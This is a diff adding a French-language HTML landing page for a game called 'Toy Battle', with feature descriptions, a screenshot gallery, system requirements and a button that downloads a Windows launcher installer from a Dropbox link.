@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description"
+        content="Toy Battle — Le jeu de combat de jouets ultime. Téléchargez le launcher et rejoignez la bataille dès maintenant !">
+    <meta name="keywords" content="Toy Battle, jeu, combat, jouets, launcher, télécharger, multijoueur">
+    <title>Toy Battle — Rejoignez la Bataille</title>
+    <link rel="icon" type="image/png" href="images/icon.png">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=Inter:wght@300;400;500;600&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <!-- Particles background -->
+    <canvas id="particles-canvas"></canvas>
+
+    <!-- Navigation -->
+    <nav id="navbar">
+        <div class="nav-container">
+            <a href="#" class="nav-logo" id="nav-logo">
+                <img src="images/icon.png" alt="Toy Battle Logo" class="nav-logo-img">
+                <span>Toy Battle</span>
+            </a>
+            <ul class="nav-links" id="nav-links">
+                <li><a href="#features" id="nav-features">Fonctionnalités</a></li>
+                <li><a href="#gallery" id="nav-gallery">Galerie</a></li>
+                <li><a href="#specs" id="nav-specs">Configuration</a></li>
+                <li><a href="#download" class="nav-cta" id="nav-download">Télécharger</a></li>
+            </ul>
+            <button class="nav-toggle" id="nav-toggle" aria-label="Toggle menu">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section id="hero">
+        <div class="hero-bg">
+            <img src="images/hero_banner.png" alt="Toy Battle Hero" class="hero-bg-img">
+            <div class="hero-overlay"></div>
+        </div>
+        <div class="hero-content">
+            <div class="hero-badge" id="hero-badge">
+                <span class="badge-dot"></span>
+                Nouveau — Saison 2 disponible
+            </div>
+            <h1 id="hero-title">
+                <span class="hero-title-line">Le Champ de</span>
+                <span class="hero-title-line hero-title-gradient">Bataille</span>
+                <span class="hero-title-line">des Jouets</span>
+            </h1>
+            <p class="hero-subtitle" id="hero-subtitle">
+                Plongez dans des combats épiques entre jouets miniatures. Construisez votre armée,
+                élaborez vos stratégies et dominez le champ de bataille dans ce jeu d'action unique.
+            </p>
+            <div class="hero-actions">
+                <a href="#download" class="btn btn-primary" id="hero-download-btn">
+                    <svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
+                        <polyline points="7 10 12 15 17 10" />
+                        <line x1="12" y1="15" x2="12" y2="3" />
+                    </svg>
+                    Télécharger le Launcher
+                </a>
+                <a href="#gallery" class="btn btn-secondary" id="hero-gallery-btn">
+                    <svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <polygon points="5 3 19 12 5 21 5 3" />
+                    </svg>
+                    Voir le Jeu
+                </a>
+            </div>
+            <div class="hero-stats">
+                <div class="stat" id="stat-players">
+                    <span class="stat-number" data-target="12500">0</span>
+                    <span class="stat-label">Joueurs Actifs</span>
+                </div>
+                <div class="stat-divider"></div>
+                <div class="stat" id="stat-battles">
+                    <span class="stat-number" data-target="85000">0</span>
+                    <span class="stat-label">Batailles Livrées</span>
+                </div>
+                <div class="stat-divider"></div>
+                <div class="stat" id="stat-rating">
+                    <span class="stat-number stat-rating-val" data-target="4.8">0</span>
+                    <span class="stat-label">★ Note Moyenne</span>
+                </div>
+            </div>
+        </div>
+        <div class="hero-scroll-indicator" id="scroll-indicator">
+            <span>Défiler</span>
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M12 5v14M5 12l7 7 7-7" />
+            </svg>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section id="features">
+        <div class="container">
+            <div class="section-header">
+                <span class="section-tag">Pourquoi Toy Battle ?</span>
+                <h2 class="section-title">Un Jeu <span class="text-gradient">Révolutionnaire</span></h2>
+                <p class="section-subtitle">Découvrez ce qui rend Toy Battle unique en son genre.</p>
+            </div>
+            <div class="features-grid">
+                <div class="feature-card" id="feature-1">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                            <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" />
+                        </svg>
+                    </div>
+                    <h3>Stratégie en Temps Réel</h3>
+                    <p>Commandez vos unités de jouets sur des champs de bataille dynamiques. Chaque décision compte.</p>
+                </div>
+                <div class="feature-card" id="feature-2">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                            <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
+                            <circle cx="9" cy="7" r="4" />
+                            <path d="M23 21v-2a4 4 0 0 0-3-3.87" />
+                            <path d="M16 3.13a4 4 0 0 1 0 7.75" />
+                        </svg>
+                    </div>
+                    <h3>Multijoueur en Ligne</h3>
+                    <p>Affrontez des joueurs du monde entier dans des batailles intenses et compétitives.</p>
+                </div>
+                <div class="feature-card" id="feature-3">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                            <rect x="3" y="3" width="7" height="7" />
+                            <rect x="14" y="3" width="7" height="7" />
+                            <rect x="14" y="14" width="7" height="7" />
+                            <rect x="3" y="14" width="7" height="7" />
+                        </svg>
+                    </div>
+                    <h3>Personnalisation Totale</h3>
+                    <p>Des centaines de jouets à collectionner et personnaliser pour créer l'armée parfaite.</p>
+                </div>
+                <div class="feature-card" id="feature-4">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                            <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z" />
+                        </svg>
+                    </div>
+                    <h3>Mises à Jour Régulières</h3>
+                    <p>Du nouveau contenu chaque saison : unités, cartes, modes de jeu et événements spéciaux.</p>
+                </div>
+                <div class="feature-card" id="feature-5">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+                        </svg>
+                    </div>
+                    <h3>Anti-Triche Intégré</h3>
+                    <p>Un système de sécurité robuste garantissant une expérience de jeu équitable pour tous.</p>
+                </div>
+                <div class="feature-card" id="feature-6">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                            <circle cx="12" cy="12" r="10" />
+                            <polygon points="10 8 16 12 10 16 10 8" />
+                        </svg>
+                    </div>
+                    <h3>Mode Campagne</h3>
+                    <p>Une histoire captivante à travers plus de 50 missions solo avec des boss épiques.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Gallery / Screenshots Section -->
+    <section id="gallery">
+        <div class="container">
+            <div class="section-header">
+                <span class="section-tag">Captures d'Écran</span>
+                <h2 class="section-title">Explorez le <span class="text-gradient">Champ de Bataille</span></h2>
+                <p class="section-subtitle">Aperçu de l'action qui vous attend dans Toy Battle.</p>
+            </div>
+            <div class="gallery-showcase">
+                <div class="gallery-main" id="gallery-main">
+                    <img src="images/screenshot1.png" alt="Gameplay Screenshot" id="gallery-main-img">
+                    <div class="gallery-main-overlay">
+                        <span class="gallery-caption" id="gallery-caption">Combat en arène — Affrontez vos adversaires
+                            dans des arènes colorées</span>
+                    </div>
+                </div>
+                <div class="gallery-thumbs" id="gallery-thumbs">
+                    <button class="gallery-thumb active" data-img="images/screenshot1.png"
+                        data-caption="Combat en arène — Affrontez vos adversaires dans des arènes colorées"
+                        id="thumb-1">
+                        <img src="images/screenshot1.png" alt="Screenshot 1">
+                    </button>
+                    <button class="gallery-thumb" data-img="images/screenshot2.png"
+                        data-caption="Bataille multijoueur — Combattez en équipe pour la victoire" id="thumb-2">
+                        <img src="images/screenshot2.png" alt="Screenshot 2">
+                    </button>
+                    <button class="gallery-thumb" data-img="images/screenshot3.png"
+                        data-caption="Sélection d'unités — Composez votre armée de jouets" id="thumb-3">
+                        <img src="images/screenshot3.png" alt="Screenshot 3">
+                    </button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- System Requirements -->
+    <section id="specs">
+        <div class="container">
+            <div class="section-header">
+                <span class="section-tag">Configuration Requise</span>
+                <h2 class="section-title">Prêt à <span class="text-gradient">Combattre</span> ?</h2>
+                <p class="section-subtitle">Vérifiez que votre machine est prête pour le combat.</p>
+            </div>
+            <div class="specs-grid">
+                <div class="spec-card" id="spec-minimum">
+                    <div class="spec-card-header">
+                        <span class="spec-badge spec-badge-min">Minimum</span>
+                    </div>
+                    <ul class="spec-list">
+                        <li>
+                            <span class="spec-label">OS</span>
+                            <span class="spec-value">Windows 10 64-bit</span>
+                        </li>
+                        <li>
+                            <span class="spec-label">CPU</span>
+                            <span class="spec-value">Intel i5-4460 / AMD Ryzen 3 1200</span>
+                        </li>
+                        <li>
+                            <span class="spec-label">RAM</span>
+                            <span class="spec-value">8 Go</span>
+                        </li>
+                        <li>
+                            <span class="spec-label">GPU</span>
+                            <span class="spec-value">GTX 960 / RX 560</span>
+                        </li>
+                        <li>
+                            <span class="spec-label">Stockage</span>
+                            <span class="spec-value">15 Go disponibles</span>
+                        </li>
+                        <li>
+                            <span class="spec-label">Réseau</span>
+                            <span class="spec-value">Connexion Internet</span>
+                        </li>
+                    </ul>
+                </div>
+                <div class="spec-card spec-card-recommended" id="spec-recommended">
+                    <div class="spec-card-header">
+                        <span class="spec-badge spec-badge-rec">Recommandé ★</span>
+                    </div>
+                    <ul class="spec-list">
+                        <li>
+                            <span class="spec-label">OS</span>
+                            <span class="spec-value">Windows 10/11 64-bit</span>
+                        </li>
+                        <li>
+                            <span class="spec-label">CPU</span>
+                            <span class="spec-value">Intel i7-8700 / AMD Ryzen 5 3600</span>
+                        </li>
+                        <li>
+                            <span class="spec-label">RAM</span>
+                            <span class="spec-value">16 Go</span>
+                        </li>
+                        <li>
+                            <span class="spec-label">GPU</span>
+                            <span class="spec-value">GTX 1070 / RX 5700 XT</span>
+                        </li>
+                        <li>
+                            <span class="spec-label">Stockage</span>
+                            <span class="spec-value">20 Go SSD</span>
+                        </li>
+                        <li>
+                            <span class="spec-label">Réseau</span>
+                            <span class="spec-value">Connexion haut débit</span>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Download CTA Section -->
+    <section id="download">
+        <div class="download-glow"></div>
+        <div class="container">
+            <div class="download-content">
+                <h2 class="download-title">Prêt à Rejoindre la <span class="text-gradient">Bataille</span> ?</h2>
+                <p class="download-subtitle">Téléchargez le launcher Toy Battle gratuitement et commencez à jouer dès
+                    maintenant.</p>
+                <div class="download-box" id="download-box">
+                    <div class="download-info">
+                        <img src="images/icon.png" alt="Toy Battle Icon" class="download-icon">
+                        <div>
+                            <h3>Toy Battle Launcher</h3>
+                            <span class="download-meta">Version 1.0.0 • Windows • 120 Mo</span>
+                        </div>
+                    </div>
+                    <a href="https://www.dropbox.com/scl/fi/bndwrvcmkf0pmnrv4hkwq/ToyBattleLauncher_Setup.exe?rlkey=2anmpw6mzu8cv0p3347rjtil9&st=rs7483ik&dl=1"
+                        class="btn btn-primary btn-lg" id="download-btn">
+                        <svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
+                            <polyline points="7 10 12 15 17 10" />
+                            <line x1="12" y1="15" x2="12" y2="3" />
+                        </svg>
+                        Télécharger Maintenant
+                    </a>
+                </div>
+                <p class="download-note">Compatible Windows 10 et supérieur — Gratuit & sans publicité</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer id="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-brand">
+                    <div class="footer-logo">
+                        <img src="images/icon.png" alt="Toy Battle" class="footer-logo-img">
+                        <span>Toy Battle</span>
+                    </div>
+                    <p class="footer-description">Le jeu de combat de jouets ultime. Construisez, combattez, dominez.
+                    </p>
+                </div>
+                <div class="footer-links-group">
+                    <h4>Jeu</h4>
+                    <ul>
+                        <li><a href="#features">Fonctionnalités</a></li>
+                        <li><a href="#gallery">Galerie</a></li>
+                        <li><a href="#download">Télécharger</a></li>
+                    </ul>
+                </div>
+                <div class="footer-links-group">
+                    <h4>Support</h4>
+                    <ul>
+                        <li><a href="#">FAQ</a></li>
+                        <li><a href="#">Contact</a></li>
+                        <li><a href="#specs">Configuration</a></li>
+                    </ul>
+                </div>
+                <div class="footer-links-group">
+                    <h4>Légal</h4>
+                    <ul>
+                        <li><a href="#">CGU</a></li>
+                        <li><a href="#">Vie Privée</a></li>
+                        <li><a href="#">Cookies</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2026 Toy Battle. Tous droits réservés.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
